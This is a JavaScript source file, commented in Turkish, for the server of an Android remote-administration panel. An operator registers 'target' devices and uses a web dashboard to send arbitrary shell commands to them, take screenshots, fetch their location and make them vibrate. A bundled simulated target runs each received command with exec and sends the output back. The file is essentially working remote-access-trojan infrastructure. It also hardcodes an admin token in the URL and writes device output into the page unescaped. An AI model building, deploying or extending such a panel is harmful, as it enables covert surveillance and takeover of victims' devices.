// andro_panel_ultimate.js
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

// --- AYARLAR ---
const PORT = process.env.PORT || 9400;
const ADMIN_TOKEN = "PRO_SECRET_2026"; 
const UPLOAD_DIR = path.join(__dirname, 'uploads');
const SCREENSHOT_DIR = path.join(__dirname, 'screenshots');

// --- VERİTABANI VE DOSYA SİSTEMİ ---
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if (!fs.existsSync(SCREENSHOT_DIR)) fs.mkdirSync(SCREENSHOT_DIR);

const db = new sqlite3.Database('./database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY, 
        name TEXT, 
        model TEXT, 
        os_version TEXT, 
        last_ip TEXT, 
        status TEXT,
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// --- GÜVENLİK ---
app.use(express.static(__dirname));
function auth(req, res, next) {
    if (req.query.token === ADMIN_TOKEN) return next();
    res.status(403).send("<h1>403 Forbidden</h1><p>Geçersiz Token.</p>");
}

// --- FRONTEND (EJS/HTML) ---
app.get('/panel', auth, (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>ANDRO ULTIMATE CONTROL</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
        .card { background: #1a1a1a; border: 1px solid #333; margin-bottom: 20px; }
        .terminal { background: #000; color: #00ff00; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; border-radius: 5px; }
        .status-online { color: #00ff00; font-weight: bold; }
        .status-offline { color: #ff4444; }
        .nav-custom { background: #000; border-bottom: 2px solid #00ff00; padding: 10px; }
        .badge-info { background: #007bff; }
    </small>
    </style>
</head>
<body>
    <div class="nav-custom mb-4">
        <div class="container d-flex justify-content-between">
            <h4 class="m-0 text-success">⚡ ANDRO ULTIMATE <span class="text-white">v3.0</span></h4>
            <span>Server: <span class="status-online">AKTİF</span></span>
        </div>
    </div>

    <div class="container">
        <div class="row" id="deviceList">
            </div>
    </div>

    <script>
        const socket = io();
        
        socket.on('updateUI', (devices) => {
            const list = document.getElementById('deviceList');
            list.innerHTML = '';
            Object.values(devices).forEach(dev => {
                list.innerHTML += \`
                <div class="col-md-6 col-lg-4">
                    <div class="card shadow-lg">
                        <div class="card-header d-flex justify-content-between">
                            <strong>\${dev.name}</strong>
                            <span class="\${dev.online ? 'status-online' : 'status-offline'}">
                                \${dev.online ? '● ONLINE' : '● OFFLINE'}
                            </span>
                        </div>
                        <div class="card-body">
                            <p class="small mb-1">Model: \${dev.model} | OS: \${dev.os_version}</p>
                            <p class="small mb-1">Pil: <span class="badge bg-success">%\${dev.battery || 100}</span> | RAM: %\${dev.ram_usage || 0}</p>
                            <div class="terminal mb-2" id="term_\${dev.id}">$ Bekliyor...</div>
                            <div class="input-group input-group-sm mb-2">
                                <input type="text" class="form-control bg-dark text-white border-secondary" id="cmd_\${dev.id}" placeholder="Shell komutu...">
                                <button class="btn btn-success" onclick="sendCmd('\${dev.id}')">GÖNDER</button>
                            </div>
                            <div class="btn-group w-100">
                                <button class="btn btn-sm btn-outline-primary" onclick="reqAction('\${dev.id}', 'screenshot')">📸 SS Al</button>
                                <button class="btn btn-sm btn-outline-warning" onclick="reqAction('\${dev.id}', 'vibrate')">📳 Titreş</button>
                                <button class="btn btn-sm btn-outline-danger" onclick="reqAction('\${dev.id}', 'location')">📍 Konum</button>
                            </div>
                        </div>
                    </div>
                </div>\`;
            });
        });

        function sendCmd(id) {
            const cmd = document.getElementById('cmd_'+id).value;
            socket.emit('admin_action', { targetId: id, type: 'shell', data: cmd });
            document.getElementById('term_'+id).innerHTML += '<div>> ' + cmd + '</div>';
        }

        function reqAction(id, type) {
            socket.emit('admin_action', { targetId: id, type: type });
        }

        socket.on('output', (res) => {
            const term = document.getElementById('term_'+res.id);
            if(term) term.innerHTML += '<div class="text-info">' + res.data + '</div>';
        });
    </script>
</body>
</html>
    `);
});

// --- SOCKET.IO MANTIĞI (SERVER SİDE) ---
let liveClients = {};

io.on('connection', (socket) => {
    console.log('Bağlantı:', socket.id);

    // Cihaz Kaydı ve DB Yazma
    socket.on('register', (info) => {
        liveClients[socket.id] = { ...info, id: socket.id, online: true };
        db.run(`INSERT OR REPLACE INTO devices (id, name, model, os_version, last_ip, status) 
                VALUES (?, ?, ?, ?, ?, 'online')`, 
                [socket.id, info.name, info.model, info.os_version, socket.handshake.address]);
        io.emit('updateUI', liveClients);
    });

    // Yönetici Hareketleri
    socket.on('admin_action', (pkg) => {
        io.to(pkg.targetId).emit('execute', pkg);
    });

    // Cihazdan Gelen Çıktılar
    socket.on('report', (data) => {
        io.emit('output', { id: socket.id, data: data });
    });

    socket.on('disconnect', () => {
        if (liveClients[socket.id]) liveClients[socket.id].online = false;
        io.emit('updateUI', liveClients);
    });
});

// --- CLIENT SIMULATION (Target Device) ---
// Bu kısım normalde Android cihazdaki serviste çalışır.
function simulateTarget() {
    const ioClient = require('socket.io-client');
    const target = ioClient.connect(`http://localhost:${PORT}`);

    target.on('connect', () => {
        target.emit('register', {
            name: "Hacker's Phone",
            model: "Samsung S24 Ultra",
            os_version: "Android 14",
            battery: 92
        });
    });

    target.on('execute', (pkg) => {
        if (pkg.type === 'shell') {
            exec(pkg.data, (err, stdout, stderr) => {
                target.emit('report', stdout || stderr || "Komut tamamlandı.");
            });
        } else if (pkg.type === 'screenshot') {
            target.emit('report', "Ekran görüntüsü alındı (Simülasyon)");
        }
    });
}

// --- BAŞLAT ---
http.listen(PORT, '0.0.0.0', () => {
    console.log(`\n\x1b[32m[+] ANDRO PRO AKTİF: http://localhost:${PORT}/panel?token=${ADMIN_TOKEN}\x1b[0m`);
    simulateTarget(); // Test için bir cihaz oluşturur
});
